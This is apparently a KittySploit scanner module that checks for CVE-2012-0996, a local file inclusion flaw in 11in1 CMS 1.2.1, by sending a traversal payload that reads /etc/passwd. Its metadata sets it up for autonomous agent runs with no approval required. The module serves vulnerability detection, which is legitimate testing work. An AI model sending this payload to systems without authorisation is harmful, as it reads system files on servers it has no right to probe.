#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Multiple directory traversal vulnerabilities in 11in1 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': '11in1 CMS 1.2.1 - Local File Inclusion (LFI) Detection',
        'description': 'Multiple directory traversal vulnerabilities in 11in1 1.2.1 stable 12-31-2011 allow remote attackers to read arbitrary files via a .. (dot dot) in the class parameter to (1) index.php or (2) admin/index.php.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2012', 'lfi', 'edb', '11in1', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/36784',
            'https://nvd.nist.gov/vuln/detail/CVE-2012-0996',
            'https://www.htbridge.ch/advisory/HTB23071',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2012-0996',
    }

    def run(self):
        r = self.http_request(method="GET", path='/index.php?class=../../../../../../../etc/passwd%00', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='medium',
                reason="11in1 CMS 1.2.1 - Local File Inclusion (LFI) detected",
                path='/index.php?class=../../../../../../../etc/passwd%00',
            )
            return True
        return False

